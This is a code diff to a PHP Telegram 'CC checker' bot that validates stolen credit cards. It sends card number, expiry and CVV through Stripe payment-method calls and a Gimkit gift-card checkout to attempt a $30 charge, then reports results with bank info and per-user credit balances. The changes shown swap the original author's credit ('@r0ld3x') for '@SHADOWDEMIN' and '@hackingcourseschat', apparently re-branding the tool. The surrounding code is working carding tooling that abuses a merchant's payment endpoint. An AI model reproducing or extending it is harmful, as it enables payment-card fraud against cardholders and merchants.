@@ -105,7 +105,7 @@ mysqli_close($link);
     reply_to($chatId,$message_id,$keyboard,$antispam);
     exit();
     }
-$sss = reply_to($chatId,$message_id,$keyboard,"<b> CC ->> <code>$cc|$mes|$ano|$cvv</code> %0APROCESS ->> □□□□□ 0%[🟥] %0ATIME ->> {$mytime($starttime)}s %0ACHECKING BY ->> <a href='tg://user?id=$gId'>@$username</a> %0ABOT BY :- <a href='tg://user?id=1317173146'>@r0ld3x</a></b>");
+$sss = reply_to($chatId,$message_id,$keyboard,"<b> CC ->> <code>$cc|$mes|$ano|$cvv</code> %0APROCESS ->> □□□□□ 0%[🟥] %0ATIME ->> {$mytime($starttime)}s %0ACHECKING BY ->> <a href='tg://user?id=$gId'>@$username</a> %0ABOT BY :- <a href='tg://user?id=1655261524'>@SHADOWDEMIN</a></b>");
 $respon = json_decode($sss, TRUE);
 $message_id_1 = $respon['result']['message_id'];
 ///////////////////////////////////////////////////////////////////////////////////////////////////////////////
@@ -175,7 +175,7 @@ curl_close($ch);
     edit_message($chatId,$message_id_1,$keyboard, "<b>❌BIN BANNED</b>");
     exit();
     }
-edit_message($chatId,$message_id_1,$keyboard,"<b> CC ->> <code>$cc|$mes|$ano|$cvv</code> %0APROCESS ->> ■■□□□ 40%[🟧] %0ATIME ->> {$mytime($starttime)}s %0ACHECKING BY ->> <a href='tg://user?id=$gId'>@$username</a> %0ABOT BY :- <a href='tg://user?id=1317173146'>@r0ld3x</a></b>");
+edit_message($chatId,$message_id_1,$keyboard,"<b> CC ->> <code>$cc|$mes|$ano|$cvv</code> %0APROCESS ->> ■■□□□ 40%[🟧] %0ATIME ->> {$mytime($starttime)}s %0ACHECKING BY ->> <a href='tg://user?id=$gId'>@$username</a> %0ABOT BY :- <a href='tg://user?id=1655261524'>@SHADOWDEMIN</a></b>");
 ///////////////////////////////////////////////////////////////////////////////////////////////////////////////
 $ch = curl_init();
     curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/payment_methods');
@@ -206,7 +206,7 @@ $cap1 = json_decode($result1, true);
 $id = $cap1['id'];
 curl_close($ch);
 ///////////////////////////////////////////////////////////////////////////////////////////////////////////////
-edit_message($chatId,$message_id_1,$keyboard,"<b> CC ->> <code>$cc|$mes|$ano|$cvv</code> %0APROCESS ->> ■■■□□ 60%[🟨] %0ATIME ->> {$mytime($starttime)}s %0ACHECKING BY ->> <a href='tg://user?id=$gId'>@$username</a> %0ABOT BY :- <a href='tg://user?id=1317173146'>@r0ld3x</a></b>");
+edit_message($chatId,$message_id_1,$keyboard,"<b> CC ->> <code>$cc|$mes|$ano|$cvv</code> %0APROCESS ->> ■■■□□ 60%[🟨] %0ATIME ->> {$mytime($starttime)}s %0ACHECKING BY ->> <a href='tg://user?id=$gId'>@$username</a> %0ABOT BY :- <a href='tg://user?id=1655261524'>@SHADOWDEMIN</a></b>");
 
 $ch = curl_init();
     curl_setopt($ch, CURLOPT_URL, 'https://www.gimkit.com/api/billing/create-gift-card-session');
@@ -235,7 +235,7 @@ $ch = curl_init();
     $cap1 = json_decode($result, true);
     $cs = $cap1['id'];
 curl_close($ch);
-edit_message($chatId,$message_id_1,$keyboard,"<b> CC ->> <code>$cc|$mes|$ano|$cvv</code> %0APROCESS ->> ■■■■■ 100%[🟩] %0ATIME ->> {$mytime($starttime)}s %0ACHECKING BY ->> <a href='tg://user?id=$gId'>@$username</a> %0ABOT BY :- <a href='tg://user?id=1317173146'>@r0ld3x</a></b>");
+edit_message($chatId,$message_id_1,$keyboard,"<b> CC ->> <code>$cc|$mes|$ano|$cvv</code> %0APROCESS ->> ■■■■■ 100%[🟩] %0ATIME ->> {$mytime($starttime)}s %0ACHECKING BY ->> <a href='tg://user?id=$gId'>@$username</a> %0ABOT BY :- <a href='tg://user?id=1655261524'>@SHADOWDEMIN</a></b>");
 if (!empty($cs)) {
 $ch = curl_init();
     curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/payment_pages/'.$cs.'/confirm');
@@ -325,7 +325,7 @@ if(!empty($ccc)){
 if(empty($result) or empty($status) or empty($cc_code) or empty($code)){
 $result = urlencode("<b>
 GATE --> STRIPE - CHARGE 30USD
-CC ->> <code>$cc|$mes|$ano|$cvv|@RoldexVerse</code>
+CC ->> <code>$cc|$mes|$ano|$cvv|@hackingcourseschat</code>
 Code ->> Request not executed
 Result ->> Unknown error
 Message ->> Check again
@@ -334,7 +334,7 @@ Bank Info ->> $roldex-$bincap2-{$flag($bincap2)}
 Time ->> {$mytime($starttime)}s
 Checked By ->> <a href='tg://user?id=$gId'>@${username}</a>[$role]
 Credit Left ->> ${balance}💰
-Bot By --> <a href='tg://user?id=1317173146'>@r0ld3x</a></b>");
+Bot By --> <a href='tg://user?id=1655261524'>@SHADOWDEMIN</a></b>");
 edit_message($chatId,$message_id_1,$keyboard, $result);
     $timest = time();
 
@@ -364,7 +364,7 @@ $link = mysqli_connect("localhost", "root", "", "demo");
 mysqli_close($link);
 $result = urlencode("<b>
 GATE --> STRIPE - CHARGE 30USD
-CC ->> <code>$cc|$mes|$ano|$cvv|@RoldexVerse</code>
+CC ->> <code>$cc|$mes|$ano|$cvv|@hackingcourseschat</code>
 Code ->> $code
 Result ->> $status
 Message ->> $cc_code
@@ -373,7 +373,7 @@ Bank Info ->> $roldex-$bincap2-{$flag($bincap2)}
 Time ->> {$mytime($starttime)}s
 Checked By ->> <a href='tg://user?id=$gId'>@${username}</a>[$role]
 Credit Left ->> ${balance}💰
-Bot By --> <a href='tg://user?id=1317173146'>@r0ld3x</a></b>");
+Bot By --> <a href='tg://user?id=1655261524'>@SHADOWDEMIN</a></b>");
 edit_message($chatId,$message_id_1,$keyboard, $result);
     rest($list);
     $timest = time();
